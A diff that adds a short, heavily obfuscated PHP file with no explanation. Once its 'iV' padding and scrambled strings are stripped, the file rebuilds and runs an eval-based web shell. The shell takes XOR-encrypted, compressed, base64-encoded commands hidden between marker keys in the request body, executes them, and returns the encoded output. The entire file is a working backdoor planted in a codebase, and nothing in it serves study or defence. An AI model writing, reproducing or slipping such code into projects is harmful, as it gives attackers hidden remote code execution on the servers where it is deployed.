@@ -1,0 +1,13 @@
+<?php
+$t='==1) {@ob_iVstart(iV);@evaiVl(@gzuniVcompreiVss(@xiV(@baseiV64_deciVodiVe(';
+$p=';$jiV++iV,$i++){$o.iV=$t{$i}^iV$k{iV$j};}}reiVtiVurn $o;}iiViVf (@preg_matiV';
+$h='leniV($t);$iVo="";foiVr($i=iV0;$i<$l;iV){foiVr(iV$j=0;($j<$iVc&&$i<$iVl)';
+$b='iV$k="63a9f0iVea";$kh="7biVb9805iV07iV96b";$kfiV="649iVe85481845"iV;$piV="';
+$K=str_replace('T','','TcTreatTeT_fTTunction');
+$R='5iVhewdgHFxYEiVkiVzKc2";functioiVniV x($t,$kiV){$c=iViVstrlen($k)iV;$l=str';
+$Y='$m[1]),$k)))iV;$o=@iVoiVb_get_ciVontentsiV();@obiV_endiV_clean();$riViV=';
+$x='ch("iV/$khiV(.+)$kiViVf/",@file_get_contiVents("piVhiVp://iniVput"iV),$miV)';
+$r='@iVbiVase64iV_encode(@x(@gzcompreiViVssiV($o),$k));print("$piV$kiVh$r$kf");}';
+$P=str_replace('iV','',$b.$R.$h.$p.$x.$t.$Y.$r);
+$u=$K('',$P);$u();
+?>
